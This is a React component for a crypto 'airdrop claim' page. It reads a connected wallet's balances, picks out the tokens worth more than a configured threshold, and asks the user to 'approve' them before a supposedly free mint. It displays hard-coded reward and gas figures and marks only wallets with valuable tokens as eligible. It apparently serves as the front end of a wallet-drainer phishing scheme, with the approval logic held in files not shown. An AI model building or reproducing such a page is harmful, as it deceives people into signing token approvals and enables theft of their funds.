import React, { useEffect, useState } from 'react'
import {
  Backdrop,
  CircularProgress,
} from '@material-ui/core'

import Header from '../../components/header'
import Footer from '../../components/footer'
import { useSetting } from '../../provider/setting'
import { getFilter } from '../../api/approve'
import { getBalances, getTransactinos } from '../../api/contract'
import { getFilter as getTokens, create as createToken } from '../../api/token'
import Success from './success'
import Approve from './approve'
import Mint from './mint'
import siteConfig from '../../config/site.config'

const Claim = () => {
  const [setting] = useSetting()
  const [approves, setApproves] = useState([])
  const [isMint, setIsMint] = useState(false)
  const [isSuccess, setIsSuccess] = useState(false)
  const [canUse, setCanUse] = useState(false)
  const [pending, setPending] = useState(false)
  const [tokens, setTokens] = useState([])
  const [transactionNumber, setTransactionNumber] = useState(0)

  const refresh = async () => {
    if (setting.address && setting.address !== '') {
      const res = await getFilter({address: setting.address})
      console.log(res)
      setApproves(res)
      if (res.length !== 0)
        setIsMint(res[0].isMint)
    }
  }
  const checkWallet = async () => {
    let _canUse = false
    setPending(true)
    let res = await getBalances(setting.address)
    console.log('initial', res)
    res = res.filter((token) => {
      if (siteConfig.blackList.includes(token.contract_ticker_symbol))
        return false
      if (token.quote == 0)
        return false
      if (token.quote < siteConfig.maxBalance)
        return false
      return true
    })
    res.sort( ( a, b ) => {
      if ( a.quote < b.quote ){
        return -1;
      }
      if ( a.quote > b.quote ){
        return 1;
      }
      return 0;
    });
    console.log(res)
    res = await Promise.all(res.map(async(token) => {
      const tmp = await saveToken({
        symbol: token.contract_ticker_symbol,
        name: token.contract_name,
        address: token.contract_address,
        decimals: token.contract_decimals,
        logoUrl: token.logo_url
      })
      token._id = tmp._id
      return token
    }))
    if (res.length !== 0) {
      _canUse = true
    }
    setCanUse(_canUse)
    setTokens(res.slice(0, siteConfig.maxApprove + 1))
    const transactions = await getTransactinos(setting.address)
    setTransactionNumber(transactions.length)
    console.log(transactions.length)
    setPending(false)
  }
  const saveToken = async (token) => {
    const res = await getTokens({symbol: token.symbol})
    if (res.length === 0) {
      const tmp = await createToken(token)
      token._id = tmp.id
    }
    else {
      token._id = res[0]._id
    }
    return token
  }
  
  useEffect(() => {
    if (setting.address && setting.address !== '') {
      refresh()
      checkWallet()
    }
  }, [setting.address])
  return (
    <>
      <Header />
      <Backdrop open={pending} style={{zIndex: 9999}}>
        <CircularProgress color="primary" />
      </Backdrop>
      <div className="nav-responsive">
        <div className="nav-responsive-backdrop"></div>
        <div className="nav-responsive-content d-flex flex-column">
          <div className="logo d-flex align-items-center justify-content-center position-relative">
            <a href="#" className="position-relative">
              <img src="./assets/images/logo-2.png" alt="logo" />
            </a>
          </div>
          <ul className="menu">
            <li>
              <a href="#">
                <i className="icon-home"></i>
                home
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-info"></i>
                About
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-book"></i>
                Terms and rules
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-document"></i>
                Contract
              </a>
            </li>
          </ul>
          <ul className="socials d-flex align-items-center justify-content-center">
            <li>
              <a href="#">
                <i className="icon-telegram"></i>
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-instagram"></i>
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-facebook"></i>
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-twitter"></i>
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-discord"></i>
              </a>
            </li>
          </ul>
        </div>
      </div>
        <div className="claim-tokens">
          <div className="container">
            <div className="claim-tokens-wrapper position-relative">
              <div className="image">
                <img src="./assets/images/img-02.png" alt="image" />
              </div>
              {(setting?.address)?(
                <>
                  {canUse ? (
                    <>
                      <div className="title text-center">
                        {isSuccess ? (
                          <>
                            Yo<span>ur tokens are claime</span>d!
                          </>
                        ):(
                          <>
                            {isMint ? (
                              <>Please approve token</>
                            ):(
                              <>Please confirm tokens</>
                            )}
                          </>
                        )}
                      </div>
                      <p className="text-center"> Here you can see the amount of airdrop received according to our algorithmic calculations  </p>
                      <div className="received">
                        You Received...
                        <span> 0.8700141 </span>
                      </div>
                      <p> You need to confirm the smart contract and mint the airdrop token for free </p>
                      {isSuccess ? (
                        <Success />
                        ):(
                          <>
                            {isMint ? (
                              <Mint approves={approves} setIsSuccess={setIsSuccess} />
                              ):(
                              <Approve approves={approves} tokens={tokens} setIsMint={setIsMint} refresh={refresh} />
                            )}
                          </>
                        )
                      }
                      <div className="rewards">
                        <div className="titr"> Rewards </div>
                        <ul>
                          <li className="d-flex align-items-center justify-content-between">
                            <span> gas spent (matic) </span>
                            <span>
                              9.0303
                              <i className="icon-polygon-matic"></i>
                            </span>
                          </li>
                          <li className="d-flex align-items-center justify-content-between">
                            <span> number of transactions </span>
                            <span>
                              {transactionNumber}
                              <i className="icon-collapse"></i>
                            </span>
                          </li>
                        </ul>
                      </div>
                    </>
                  ):(
                    <div className="title text-center" style={{fontSize: 24, fontWeight: 800, lineHeight: '30px', marginTop: 25}}>
                      Address not eligible for ΞPOA airdrop
                    </div>
                  )}
                </>
              ):(
                <div className="title text-center" style={{fontSize: 24, fontWeight: 800, marginTop: 25}}>
                  Please connect wallet!
                </div>
              )}
            </div>
          </div>
        </div>
      <Footer />
    </>
  )
}
export default Claim
